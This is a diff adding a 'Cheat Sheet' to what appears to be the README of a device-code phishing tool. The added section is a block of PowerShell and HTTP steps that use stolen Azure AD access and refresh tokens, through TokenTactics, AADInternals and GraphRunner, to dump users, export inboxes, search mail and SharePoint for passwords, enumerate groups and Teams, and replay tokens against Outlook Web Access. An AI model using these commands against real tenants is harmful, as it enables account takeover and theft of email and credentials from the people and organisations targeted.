@@ -81,6 +81,47 @@ docker run -p 443:443 \
   --discord-webhook "https://discord.com/api/webhooks/your/webhook/url"
 ```
 
+
+##Cheat Sheet
+```
+powershell -ep bypass
+Import-Module .\TokenTactics.psd1
+$access_token = "eyJ0eXAiOiJ..."
+Parse-JWTtoken $access_token
+Import-Module AADInternals
+Get-AADIntUsers -AccessToken $access_token
+Get-AADIntUser -AccessToken $access_token -UserPrincipalName "admin@domain"
+$refresh_token = "1.ASYAFR..."
+RefreshTo-OutlookToken -domain mcbs.edu.om -RefreshToken $refresh_token
+
+Import-Module .\GraphRunner-main\GraphRunner.ps1
+Invoke-RefreshGraphTokens -RefreshToken $refresh_token -tenantid domain.com //this will produce $tokens var
+Get-Inbox -Tokens $tokens -userid user@domain.com -OutFile emails.csv
+Invoke-SearchMailbox -Tokens $tokens -SearchTerm "Password"
+Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm 'password AND filetype:xlsx'
+Invoke-GraphRecon -Tokens $tokens -PermissionEnum
+Get-AzureADUsers -Tokens $tokens -OutFile users.txt
+Get-SecurityGroups -AccessToken $tokens.access_token
+Get-UpdatableGroups -Tokens $tokens
+Get-SharePointSiteURLs -Tokens $tokens
+Get-TenantID -Domain domain.com
+Get-TeamsChannels -Tokens $tokens
+Find-ChannelEmails -Tokens $tokens
+
+To access https://outlook.office.com
+
+POST /owa HTTP/1.1
+Host: outlook.office.com
+Content-Type: application/x-www-form-urlencoded
+
+code=$Outlook_refresh_token
+&id_token=$Outlook_access_token
+
+If response is 302, copy response and open in browser.
+
+
+to access Teams, must convert tokens with TokenTacticsV2 first
+```
 =====================================
 # DeviceCodePhishing
 
